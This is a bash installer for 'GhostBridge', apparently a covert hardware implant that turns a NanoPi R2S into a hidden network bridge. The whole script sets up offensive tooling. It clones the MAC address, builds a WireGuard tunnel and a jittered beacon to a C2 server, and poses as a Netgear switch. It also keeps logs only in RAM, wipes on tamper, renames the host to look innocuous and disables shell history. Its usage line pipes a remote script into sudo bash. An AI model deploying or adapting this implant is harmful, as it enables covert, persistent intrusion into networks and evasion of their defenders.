#!/bin/bash
#
# GhostBridge Installation Script
#
# Installs GhostBridge on a fresh NanoPi R2S / Armbian system.
#
# Usage: curl -sSL https://raw.githubusercontent.com/.../install.sh | sudo bash
#    or: sudo ./install.sh
#

set -e

# Configuration
INSTALL_DIR="/opt/ghostbridge"
CONFIG_DIR="/etc/ghostbridge"
DATA_DIR="/var/ghostbridge"
SERVICE_DIR="/etc/systemd/system"
PYTHON_MIN="3.11"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
log_step() { echo -e "${BLUE}[STEP]${NC} $1"; }

# Check root
if [ "$EUID" -ne 0 ]; then
    log_error "Please run as root (sudo)"
    exit 1
fi

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║           GhostBridge Installation Script                ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Step 1: System check
log_step "Checking system requirements..."

# Check OS
if [ -f /etc/os-release ]; then
    . /etc/os-release
    log_info "OS: $PRETTY_NAME"
else
    log_warn "Could not detect OS"
fi

# Check architecture
ARCH=$(uname -m)
log_info "Architecture: $ARCH"

# Check Python version
if command -v python3 &> /dev/null; then
    PYTHON_VER=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
    log_info "Python: $PYTHON_VER"
else
    log_error "Python 3 not found"
    exit 1
fi

# Step 2: Install dependencies
log_step "Installing system dependencies..."

apt-get update -qq
apt-get install -y -qq \
    python3 python3-pip python3-venv \
    wireguard wireguard-tools \
    bridge-utils iproute2 \
    net-tools curl wget git \
    > /dev/null 2>&1

log_info "Dependencies installed"

# Step 3: Create directories
log_step "Creating directories..."

mkdir -p "$INSTALL_DIR"
mkdir -p "$CONFIG_DIR"
mkdir -p "$DATA_DIR/run"
mkdir -p "$DATA_DIR/log"

chmod 700 "$CONFIG_DIR"
chmod 700 "$DATA_DIR"

log_info "Directories created"

# Step 4: Install GhostBridge
log_step "Installing GhostBridge..."

# Check if source exists (local install)
if [ -d "./src/ghostbridge" ]; then
    log_info "Installing from local source..."
    cp -r . "$INSTALL_DIR/"
else
    # Clone from repo
    log_info "Cloning repository..."
    git clone --depth 1 https://github.com/momo/ghostbridge.git "$INSTALL_DIR" 2>/dev/null || {
        log_error "Failed to clone repository"
        exit 1
    }
fi

# Create virtual environment
log_info "Creating virtual environment..."
python3 -m venv "$INSTALL_DIR/venv"
source "$INSTALL_DIR/venv/bin/activate"

# Install package
pip install --quiet --upgrade pip
pip install --quiet -e "$INSTALL_DIR"

log_info "GhostBridge installed"

# Step 5: Generate keys
log_step "Generating cryptographic keys..."

# WireGuard keys
wg genkey | tee "$CONFIG_DIR/wg_private.key" | wg pubkey > "$CONFIG_DIR/wg_public.key"
chmod 600 "$CONFIG_DIR/wg_private.key"

# Device ID
DEVICE_ID="ghost-$(date +%s | tail -c 6)"
echo "$DEVICE_ID" > "$CONFIG_DIR/device_id"

log_info "Device ID: $DEVICE_ID"
log_info "Public Key: $(cat $CONFIG_DIR/wg_public.key)"

# Step 6: Create default config
log_step "Creating configuration..."

if [ ! -f "$CONFIG_DIR/config.yml" ]; then
    cat > "$CONFIG_DIR/config.yml" << EOF
# GhostBridge Configuration
# Generated: $(date -Iseconds)

device:
  id: "$DEVICE_ID"
  name: "GhostBridge Device"

network:
  bridge_name: "br0"
  wan_interface: "eth0"
  lan_interface: "eth1"
  clone_mac: true

tunnel:
  type: "wireguard"
  interface: "wg0"
  endpoint: ""  # Configure before deployment!
  keepalive: 25
  reconnect_delays: [5, 10, 30, 60, 300]

beacon:
  enabled: true
  interval: 300
  jitter: 60

c2:
  api_endpoint: ""  # Configure before deployment!
  timeout: 30
  verify_ssl: true

stealth:
  ramfs_logs: true
  fake_identity: "Netgear GS105"
  panic_on_tamper: true

logging:
  level: "WARNING"
  to_disk: false
  max_lines: 1000
EOF

    chmod 600 "$CONFIG_DIR/config.yml"
    log_info "Configuration created at $CONFIG_DIR/config.yml"
else
    log_warn "Configuration already exists, skipping"
fi

# Step 7: Install scripts
log_step "Installing scripts..."

cp "$INSTALL_DIR/scripts/setup-bridge.sh" "$CONFIG_DIR/"
cp "$INSTALL_DIR/scripts/teardown-bridge.sh" "$CONFIG_DIR/"
cp "$INSTALL_DIR/scripts/panic.sh" "/usr/local/bin/ghostbridge-panic"

chmod +x "$CONFIG_DIR/setup-bridge.sh"
chmod +x "$CONFIG_DIR/teardown-bridge.sh"
chmod +x "/usr/local/bin/ghostbridge-panic"

log_info "Scripts installed"

# Step 8: Install systemd services
log_step "Installing systemd services..."

cp "$INSTALL_DIR/services/"*.service "$SERVICE_DIR/"
cp "$INSTALL_DIR/services/"*.timer "$SERVICE_DIR/" 2>/dev/null || true

systemctl daemon-reload

log_info "Systemd services installed"

# Step 9: System hardening
log_step "Applying system hardening..."

# Disable unnecessary services
for svc in bluetooth cups avahi-daemon ModemManager; do
    systemctl disable --now "$svc" 2>/dev/null || true
done

# Set hostname to something innocuous
if [ "$(hostname)" = "nanopi-r2s" ] || [ "$(hostname)" = "armbian" ]; then
    hostnamectl set-hostname "netswitch"
    log_info "Hostname set to 'netswitch'"
fi

# Disable shell history
echo "unset HISTFILE" >> /etc/profile.d/no-history.sh
chmod +x /etc/profile.d/no-history.sh

log_info "System hardened"

# Step 10: Summary
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║           Installation Complete!                         ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "Device ID:    ${BLUE}$DEVICE_ID${NC}"
echo -e "Public Key:   ${BLUE}$(cat $CONFIG_DIR/wg_public.key)${NC}"
echo ""
echo -e "${YELLOW}Next Steps:${NC}"
echo "1. Edit $CONFIG_DIR/config.yml"
echo "   - Set tunnel.endpoint to your C2 server"
echo "   - Set c2.api_endpoint to your MoMo API"
echo ""
echo "2. Create WireGuard config at /etc/wireguard/wg0.conf"
echo ""
echo "3. Enable and start services:"
echo "   systemctl enable ghostbridge ghostbridge-tunnel ghostbridge-beacon"
echo "   systemctl start ghostbridge"
echo ""
echo "4. Add this peer to your C2 WireGuard server:"
echo "   [Peer]"
echo "   # $DEVICE_ID"
echo "   PublicKey = $(cat $CONFIG_DIR/wg_public.key)"
echo "   AllowedIPs = 10.66.66.2/32"
echo ""
log_info "Run 'ghostbridge test' to verify installation"

